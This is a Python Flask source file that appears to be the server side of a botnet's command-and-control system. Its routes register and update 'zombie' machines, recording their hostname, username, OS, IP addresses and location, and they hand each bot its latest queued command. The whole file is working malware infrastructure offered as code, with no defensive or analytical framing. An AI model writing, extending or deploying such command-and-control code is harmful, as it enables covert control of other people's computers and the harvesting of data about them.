
from flask import Blueprint, request
from datetime import datetime as dt

from models.bot import Bot
from models.command import Command

from schemas.command import cmd_schema

from utils.database import database

bots = Blueprint("bots", __name__)


@bots.route("/api/bot", methods=["POST"])
def add_bot():

	success_code = 0

	requests_data = request.get_json()	

	zombie_exists = database.session.query(Bot.uuid) \
		.filter_by(uuid=requests_data["uuid"]) \
		.first() is not None

	if zombie_exists:

		return { "success": success_code }

	bot = Bot(**requests_data)

	try: 
		
		database.session.add(bot)
		database.session.commit()

		success_code = 1

	except Exception:

		database.session.rollback()

	finally:

		return { "success": success_code }


@bots.route("/api/bot", methods=["PUT"])
def update_bot():

	success_code = 0

	requests_data = request.get_json()	

	bot = Bot.query.get(requests_data["uuid"])

	if not bot:

		return { "success": success_code }

	bot.hostname = requests_data["hostname"]
	bot.username = requests_data["username"]
	bot.os = requests_data["os"]
	bot.remote_ip = requests_data["remote_ip"]
	bot.datetime = dt.now().strftime("%Y-%m-%d %H:%M:%S")
	bot.local_ip = requests_data["local_ip"]
	bot.state = requests_data["state"]
	bot.location = requests_data["location"]

	try: 

		database.session.commit()

		success_code = 1

	except Exception:

		database.session.rollback()

	finally:

		return { "success": success_code }


@bots.route("/api/bot/<uuid>/command", methods=["GET"])
def get_command(uuid):

	bot = Bot.query.get(uuid)

	if not bot:

		return { "success": 0 }

	# Get last command

	cmd = bot.commands.order_by(Command.timestamp.desc()).first()

	return cmd_schema.jsonify(cmd)